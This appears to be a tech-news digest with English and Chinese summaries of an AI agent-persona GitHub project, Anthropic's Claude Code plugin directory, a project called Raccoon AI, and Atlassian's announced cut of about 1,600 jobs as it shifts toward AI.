testing testing .gitattributes .gitattributes .gitignore .gitignore CONTRIBUTING.md CONTRIBUTING.md LICENSE LICENSE README.md README.md View all files Repository files navigation 🎭 The Agency: AI Specialists Ready to Transform Your Workflow A complete AI agency at your fingertips - From frontend wizards to Reddit community ninjas, from whimsy injectors to reality checkers. Each agent is a specialized expert with personality, processes, and proven deliverables. 🚀 What Is This? Born from a Reddit thread and months of iteration, The Agency is a growing collection of meticulously crafted AI agent personalities. Each agent is: 🎯 Specialized : Deep expertise in their domain (not generic prompt templates) 🧠 Personality-Driven : Unique voice, communication style, and approach 📋 Deliverable-Focused : Real code, processes, and measurable outcomes ✅ Production-Ready : Battle-tested workflows and success metrics Think of it as : Assembling your dream team, except they're AI specialists who never sleep, never complain, and always deliver. ⚡ Quick Start Option 1: Use with Claude Code (Recommended) # Copy agents to your Claude Code directory cp -r agency-agents/ * ~ /.claude/agents/ # Now activate any agent in your Claude Code sessions: # "Hey Claude, activate Frontend Developer mode and help me build a React component" Option 2: Use as Reference Each agent file contains: Identity & personality traits Core mission & workflows Technical deliverables with code examples Success metrics & communication style Browse the agents below and copy/adapt the ones you need! Option 3: Use with Other Tools (Cursor, Aider, Windsurf, Gemini CLI, OpenCode) # Step 1 -- generate integration files for all supported tools ./scripts/convert.sh # Step 2 -- install interactively (auto-detects what you have installed) ./scripts/install.sh #
title_zh: msitarzewski/agency-agents - 触手可及的完整AI代理机构 - 从前端魔法师到Reddit社区忍者，从奇思妙想注入者到现实检验员。每个代理都是具备个性、流程和已验证交付成果的专业专家。
summary_zh: GitHub项目“msitarzewski/agency-agents”提供了一个完整的AI智能体集合，旨在将专业的人工智能助手能力置于用户指尖。该项目被描述为一个“完整的AI机构”，其智能体覆盖广泛的专业领域，从前端开发专家到Reddit社区管理高手，从创意灵感注入者到现实核查员。每个智能体都是一个拥有独特个性、标准化流程和经过验证交付成果的专项专家。，该项目的核心价值在于其高度专业化和即用性。每个智能体并非通用的提示模板，而是在特定领域（如工程设计、市场营销、产品管理、游戏开发、空间计算等）具备深厚专业知识的AI角色。它们被设计为具有独特的沟通风格、工作方法和明确的任务导向，能够产出实际的代码、流程和可衡量的成果。项目强调其“生产就绪”特性，意味着这些智能体及其工作流程都经过实战检验并附有成功指标。，项目提供了多种便捷的使用方式。推荐的方式是与Claude Code配合使用，用户只需将智能体文件复制到指定目录，即可在会话中激活并使用特定专家模式，例如激活“前端开发人员”模式来协助构建React组件。此外，用户也可以将智能体文件作为参考库，直接浏览和适配所需的工作流程与代码示例。项目还支持与其他主流开发工具（如Cursor、Aider、Windsurf等）集成，通过提供的脚本可一键生成集成文件并完成安装。，该项目起源于一个Reddit讨论，并经过数月迭代，目前仍在不断扩展其智能体阵容。它本质上是一个精心策划的AI专家团队集合，旨在为用户提供永不疲倦、即时可用的专业化AI辅助，从而彻底改变工作流程。

title: anthropics/claude-plugins-official - Official, Anthropic-managed directory of high quality Claude Code Plugins.

Anthropic does not control what MCP servers, files, or other software are included in plugins and cannot verify that they will work as intended or that they won't change. See each plugin's homepage for more information. Structure /plugins - Internal plugins developed and maintained by Anthropic /external_plugins - Third-party plugins from partners and the community Installation Plugins can be installed directly from this marketplace via Claude Code's plugin system. To install, run /plugin install {plugin-name}@claude-plugin-directory or browse for the plugin in /plugin > Discover Contributing Internal Plugins Internal plugins are developed by Anthropic team members. See /plugins/example-plugin for a reference implementation. External Plugins Third-party partners can submit plugins for inclusion in the marketplace. External plugins must meet quality and security standards for approval. To submit a new plugin, use the plugin directory submission form . Plugin Structure Each plugin follows a standard structure: plugin-name/ ├── .claude-plugin/ │ └── plugin.json # Plugin metadata (required) ├── .mcp.json # MCP server configuration (optional) ├── commands/ # Slash commands (optional) ├── agents/ # Agent definitions (optional) ├── skills/ # Skill definitions (optional) └── README.md # Documentation License Please see each linked plugin for the relevant LICENSE file. Documentation For more information on developing Claude Code plugins, see the official documentation . title_zh: anthropics/claude-plugins-official - 官方、由Anthropic管理的高质量Claude代码插件目录。
summary_zh: Anthropic在GitHub上正式推出了官方管理的Claude Code插件目录（anthropics/claude-plugins-official），这是一个经过精心筛选的高质量Claude Code插件集合。该目录旨在为用户提供一个可信赖的插件来源，以扩展Claude Code的功能。，目录结构清晰，主要分为两部分：`/plugins`目录包含由Anthropic内部开发和维护的官方插件；`/external_plugins`目录则收录来自合作伙伴和社区的第三方插件。所有外部插件在纳入市场前都必须满足一定的质量和安全标准，并通过提交表单进行申请。，每个插件都遵循标准化的文件结构，核心配置文件包括`.claude-plugin/plugin.json`（必需的插件元数据）和可选的`.mcp.json`（MCP服务器配置）。插件还可以包含`commands/`（斜杠命令）、`agents/`（智能体定义）、`skills/`（技能定义）等目录，并需提供`README.md`文档。，用户可以直接通过Claude Code的插件系统从该市场安装插件。安装方式有两种：在聊天界面运行`/plugin install {plugin-name}@claude-plugin-directory`命令，或在`/plugin > Discover`中浏览并选择。，Anthropic特别发出重要安全提醒：用户在安装、更新或使用任何插件前，务必确认其可信度。Anthropic并不控制插件所包含的MCP服务器、文件或其他软件，也无法验证其功能是否符合预期或保证其内容不会发生变化。用户应参考每个插件主页的详细信息以进行评估。，该项目为开发者提供了参考实现（`/plugins/example-plugin`），并引导他们查阅官方文档以获取更全面的插件开发指南。该官方目录的推出，标志着Claude Code的插件生态系统朝着更加规范、安全和易于发现的方向迈出了重要一步。

title: Raccoon AI
summary_zh: 是一个专注于AI模型优化与部署的开源项目，旨在简化大型语言模型（LLM）的微调、评估和集成流程。该项目提供了一套工具和API，帮助开发者更高效地定制和部署如GPT、Claude等模型，尤其关注降低技术门槛和提升模型在实际应用中的性能。，核心功能包括自动化微调流程、支持多种主流LLM架构、内置性能评估指标，以及便捷的云服务或本地部署选项。其特点在于模块化设计，允许用户根据需求灵活选择数据处理、训练或推理模块，并集成了RAG（检索增强生成）等增强技术以提升模型输出的准确性和相关性。，该项目通过GitHub开源，鼓励社区贡献，旨在推动AI技术的可访问性和实用化，为企业和研究者在自然语言处理任务中提供可靠的开发基础。

title: Atlassian to cut roughly 1,600 jobs in pivot to AI
title_zh: Atlassian将裁员约1600人 转向人工智能领域
summary_zh: Atlassian宣布将裁员约1600人以转向AI领域。这家以Jira和Confluence等协作软件闻名的公司，计划通过这次大规模重组，将资源重新聚焦于人工智能技术，以应对市场变化并推动未来增长。，此次裁员约占Atlassian全球员工总数的13%，是公司历史上规模最大的一次人员调整。管理层表示，这一“艰难决定”旨在简化运营、优化成本结构，并将投资重点转向AI驱动的产品开发。受影响的员工将获得遣散费、职业过渡支持以及股权兑现加速等补偿。，Atlassian联合创始人兼联合CEO斯科特·法夸尔和迈克·坎农-布鲁克斯在内部信中强调，公司正处在向AI优先企业转型的关键时刻。他们指出，AI技术（如大型语言模型LLM）正在重塑工作方式，Atlassian必须加速将AI能力深度集成到其核心产品中，以帮助团队更智能地规划、协作和构建软件。，作为转型的一部分，Atlassian计划加大对AI研发和工程团队的投入，并加速推进其AI助手“Atlassian Intelligence”的扩展。该功能旨在通过自然语言处理、自动化工作流和智能洞察，提升Jira、Confluence、Trello等平台的用户体验和生产力。公司相信，AI的整合将为其云产品带来显著的差异化竞争优势。，此次战略调整也反映了科技行业更广泛的趋势：许多企业正在重新分配资源，以抓住生成式AI（如GPT、Claude等模型）带来的机遇，同时应对宏观经济压力。Atlassian预计，裁员和相关措施将产生约7亿至8亿美元的税前成本，但有望在未来实现更高的运营效率和增长潜力。，尽管面临短期阵痛，Atlassian管理层对长期前景保持乐观，认为聚焦AI是保持其平台相关性和市场竞争力的必要之举。公司将继续招聘关键领域的AI人才，并致力于通过技术创新帮助客户应对日益复杂的工作挑战。
